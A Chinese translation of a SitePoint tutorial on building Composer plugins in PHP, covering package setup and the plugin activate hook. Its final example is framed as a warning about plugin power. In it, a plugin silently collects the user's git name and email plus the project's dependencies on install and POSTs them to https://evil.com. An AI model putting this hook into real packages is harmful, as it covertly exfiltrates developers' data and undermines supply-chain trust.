# 沉醉于 Composer 插件的力量

> 原文：<https://www.sitepoint.com/drunk-with-the-power-of-composer-plugins/>

Composer 是现代 PHP 开发人员工具箱中最锋利的工具。手工依赖管理的日子已经成为遥远的过去，取而代之的是像 Semver 这样的好东西。帮助我们晚上睡觉的东西，因为我们可以更新我们的依赖关系，而不用一起砸石头。

![neanderthal smashing rocks](img/646993d3a0b83072c55a6c2ad46f3bcb.png)

即使我们如此频繁地使用 Composer，也没有很多关于如何扩展它的共享知识。好像它在默认状态下做得非常好，以至于不值得花时间或精力去扩展它或记录它。甚至官方文件也在回避这个问题。大概是因为没人要吧…

然而，最近的变化使得开发 Composer 插件变得更加容易。Composer 最近也从 alpha 升级到 beta，这可能是有史以来最保守的发行周期。这个东西让现代 PHP 以目前的形式成为可能。这是专业 PHP 开发的基石。刚从阿尔法转到贝塔。

所以，今天我想我们将探索 Composer 插件开发的可能性，并在我们进行的过程中创建一些新的文档。

你可以在 github.com/assertchris-tutorials/tutorial-composer-plugins 的[找到这个插件的代码。](https://github.com/assertchris-tutorials/tutorial-composer-plugins)

## 入门指南

首先，我们需要创建一个插件库，独立于我们将要使用的应用程序。插件像任何常规依赖项一样安装。让我们用一个`composer.json`文件创建一个新文件夹:

```
{
    "type": "composer-plugin",
    "name": "sitepoint/plugin",
    "require": {
        "composer-plugin-api": "^1.0"
    }
} 
```

所有这些都很重要！我们给这个插件一个类型`composer-plugin`,否则它永远不会被这样对待。`composer-plugin`依赖关系是 Composer 生命周期中的钩子所独有的，我们将深入探讨。

我们命名这个插件，所以我们的应用程序可以把它作为一个依赖项。你可以在这里使用任何你喜欢的东西，但是你需要记住这个名字。

我们还需要要求`composer-plugin-api`。这里的版本很重要，因为我们的插件将被视为与插件 API 的特定版本兼容，这可能会影响方法签名之类的事情。

接下来，我们需要自动加载一个插件类，并告诉 Composer 它叫什么:

```
"autoload": {
    "psr-4": {
        "SitePoint\\": "src"
    }
},
"extra": {
    "class": "SitePoint\\Plugin"
} 
```

我们将创建一个带有`Plugin.php`文件的`src`文件夹。这是 Composer 将要加载的文件(作为 Composer 生命周期中的第一个钩子):

```
namespace SitePoint;

use Composer\Composer;
use Composer\IO\IOInterface;
use Composer\Plugin\PluginInterface;

class Plugin implements PluginInterface
{
    public function activate(Composer $composer, IOInterface $io)
    {
        print "hello world";
    }
} 
```

`PluginInterface`需要一个公共的`activate`方法，该方法在插件加载时被调用。到目前为止，这是验证插件代码工作正常的好时机。现在我们必须创建应用程序文件夹，并有一个自己的`composer.json`文件:

```
{
    "name": "sitepoint/app",
    "require": {
        "sitepoint/plugin": "*"
    },
    "repositories": [
        {
            "type": "path",
            "url": "../sitepoint-plugin"
        }
    ],
    "minimum-stability": "dev",
    "prefer-stable": true
} 
```

这个比以前简单多了，而且更像人们使用你的插件的方式。最好的办法是通过 Packagist 发布你的插件的稳定版本，但是当你在开发的时候，这是可以的。它告诉 Composer 需要任何可用版本的`sitepoint/plugin`，以及从哪里获得依赖。

路径存储库是 Composer 中相对较新的内容，它们自动管理依赖项的符号链接，因此您不必这样做。由于我们需要一个不稳定的依赖项，我们告诉 Composer 将最小稳定性降低到`dev`。

*在这种情况下，最好尽可能选择稳定的依赖关系……*

你现在应该可以从你的应用文件夹中运行`composer install`，并看到`hello world`消息！所有这些都不需要在 [Github](https://github.com) 或[包装商](https://packagist.org)上添加任何代码。

*我建议在开发期间运行`rm -rf vendor composer.lock; composer install`，因为它会定期重置应用程序和/或插件状态。尤其是当你开始摆弄安装文件夹的时候！*

## 探索插件功能

*要求`composer/composer`也是一个好主意，因为这将把我们将要使用的接口和类下载到供应商文件夹中。*

您将学习的关于插件的大部分内容，您可以通过查看 Composer 源代码找到。或者，您可以“检查”提供给插件的`activate`方法的两个实例。如果你使用的是像 [PHPStorm](https://www.jetbrains.com/phpstorm) 这样的 IDE，它也会有所帮助，所以你可以很容易地跳到定义。

例如，我们可以检查`$composer->getPackage()`来查看根`composer.json`文件中有什么。我们可以在安装过程中使用`$io->ask("...")`提问。

## 将这些投入使用

让我们构建一些实用的东西，尽管可能有点邪恶。让我们的插件跟踪用户和他们需要的依赖。我们首先找到他们的 Git 用户名和电子邮件:

```
public function activate(Composer $composer, IOInterface $io)
{
    exec("git config --global user.name", $name);
    exec("git config --global user.email", $email);

    $payload = [];

    if (count($name) > 0) {
        $payload["name"] = $name[0];
    }

    if (count($email) > 0) {
        $payload["email"] = $email[0];
    }
} 
```

Git 用户名和电子邮件地址通常存储在全局配置中，这意味着从终端运行`git config --global user.name`将会返回它们。我们可以更进一步，通过`exec`运行它们，并检查结果。

接下来，让我们跟踪应用程序的名称(如果定义了的话)以及依赖项和它们的版本。我们可以对开发依赖项做同样的事情，所以让我们为两者创建一个方法:

```
private function addDependencies($type, array $dependencies, array $payload)
{
    $payload = array_slice($payload, 0);

    if (count($dependencies) > 0) {
        $payload[$type] = [];
    }

    foreach ($dependencies as $dependency) {
        $name = $dependency->getTarget();
        $version = $dependency->getPrettyConstraint();

        $payload[$type][$name] = $version;
    }

    return $payload;
} 
```

我们获取每个依赖项的名称和版本约束，并将它们添加到`$payload`数组中。在有效载荷数组上调用`array_slice`确保了这个方法没有副作用，所以它可以被调用任意次，得到完全相同的结果。

这通常被称为纯函数，或者不可变变量用法的一个例子。

然后我们用依赖数组调用这个方法:

```
public function activate(Composer $composer, IOInterface $io)
{
    // ...get user details

    $app = $composer->getPackage()->getName();

    if ($app) {
        $payload["app"] = $app;
    }

    $payload = $this->addDependencies(
        "requires",
        $composer->getPackage()->getRequires(),
        $payload
    );

    $payload = $this->addDependencies(
        "dev-requires",
        $composer->getPackage()->getDevRequires(),
        $payload
    );
} 
```

最后，我们可以将这些数据发送到某个地方:

```
public function activate(Composer $composer, IOInterface $io)
{
    // ...get user details

    // ...get project details

    $context = stream_context_create([
        "http" => [
            "method" => "POST",
            "timeout" => 0.5,
            "content" => http_build_query($payload),
        ],
    ]);

    @file_get_contents("https://evil.com", false, $context);
} 
```

我们可以用[狂吃](http://docs.guzzlephp.org)来做这个，但是`file_get_contents`也可以。我们向`https://evil.com`发送一个`POST`请求，带有一个序列化的有效载荷。

## 听话

我不希望这看起来像是秘密收集用户数据的建议。但是也许知道某人*可以*收集多少数据是有用的，只需要一个精心制作的 Composer 插件。

您可以使用`composer install --no-plugins`选项，但是许多框架和内容管理系统依赖插件来正确设置自己。

一些额外的警告:

1.  如果您打算使用`exec`，过滤并验证任何非硬编码的数据。否则你就是在为你的代码制造攻击媒介。
2.  如果你要向任何地方发送数据，就通过 HTTPS 发送。否则，其他恶意的人可以从您的恶意数据收集中获益。
3.  未经同意不要跟踪用户数据。在获取数据之前询问是可能的，所以每次都要这样做！像`IOInterface::ask("...")`这样的东西正是你所需要的…

这篇文章对你有帮助吗？也许你已经有了一个插件的想法；比如自定义安装程序插件或为流行项目下载离线文档的插件。请在下面的评论中告诉我们…

## 分享这篇文章